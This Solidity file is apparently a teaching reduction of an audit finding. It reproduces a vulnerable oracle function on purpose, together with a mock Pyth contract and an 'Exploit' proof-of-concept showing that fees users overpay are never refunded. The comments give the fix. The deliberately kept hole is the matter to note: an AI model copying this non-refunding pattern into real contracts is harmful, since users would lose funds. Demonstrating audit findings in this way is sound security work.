// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  NLX (CoreDAO) — Non-refunded excess fee in _setPricesFromPriceFeeds
    (Halborn, finding #50881)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: pyth.updatePriceFeeds is called with only `updateFee`, but any
    msg.value > updateFee is never refunded — the surplus is trapped on the
    oracle module. Vulnerable line preserved verbatim (@> VULN). */

/// @dev Minimal Pyth mock: fixed update fee; accepts payable update.
contract MockPyth {
    uint256 public constant UPDATE_FEE = 0.01 ether;
    uint256 public updateCount;

    function getUpdateFee(bytes[] memory /* pythUpdateData */) external pure returns (uint256) {
        return UPDATE_FEE;
    }

    function updatePriceFeeds(bytes[] memory /* pythUpdateData */) external payable {
        require(msg.value >= UPDATE_FEE, "underpay");
        updateCount += 1;
    }

    receive() external payable {}
}

/// @dev Reduced oracle module exposing the blamed internal as a public entry.
contract OracleModule {
    MockPyth public immutable pyth;

    constructor(MockPyth pyth_) {
        pyth = pyth_;
    }

    // @dev set prices using external price feeds to save costs for tokens with stable prices
    // Faithful reduction of _setPricesFromPriceFeeds (NLX synthetics OracleModule).
    function setPricesFromPriceFeeds(address[] memory tokens, bytes[] memory pythUpdateData) external payable {
        tokens; // tokens only drive the price store in the full system
        uint updateFee = pyth.getUpdateFee(pythUpdateData);
        require(updateFee <= msg.value, "not enough funds to update price feeds");

        pyth.updatePriceFeeds{value: updateFee}(pythUpdateData); // @> VULN: excess msg.value - updateFee is never refunded to msg.sender
        // FIX: uint256 refund = msg.value - updateFee; if (refund > 0) { (bool ok,) = payable(msg.sender).call{value: refund}(""); require(ok); }
    }

    receive() external payable {}
}

contract Exploit {
    MockPyth public pyth; // CREATE nonce 1
    OracleModule public oracle; // CREATE nonce 2 — vulnerable

    uint256 public constant SENT = 0.02 ether;
    uint256 public constant FEE = 0.01 ether;
    uint256 public constant EXCESS = 0.01 ether;

    constructor() {
        pyth = new MockPyth();
        oracle = new OracleModule(pyth);
    }

    /// @notice Overpay the Pyth update fee; excess stays trapped on the oracle module.
    /// @dev Fund via msg.value (attackValueWei) or a prior balance on this contract.
    function run() external payable {
        uint256 available = address(this).balance;
        require(available >= SENT, "fund Exploit with SENT wei before/during run");

        address[] memory tokens = new address[](0);
        bytes[] memory data = new bytes[](0);

        uint256 oracleBefore = address(oracle).balance;
        uint256 selfBefore = address(this).balance;

        oracle.setPricesFromPriceFeeds{value: SENT}(tokens, data);

        uint256 oracleAfter = address(oracle).balance;
        uint256 selfAfter = address(this).balance;

        // HARM: caller paid SENT but only FEE was due; EXCESS is trapped on oracle.
        require(selfBefore - selfAfter == SENT, "caller should lose full SENT (no refund)");
        require(oracleAfter - oracleBefore == EXCESS, "excess not trapped on oracle");
        require(address(pyth).balance == FEE, "pyth should hold exactly the update fee");
        require(oracleAfter == EXCESS, "oracle holds unreimbursed excess fee");
    }

    receive() external payable {}
}
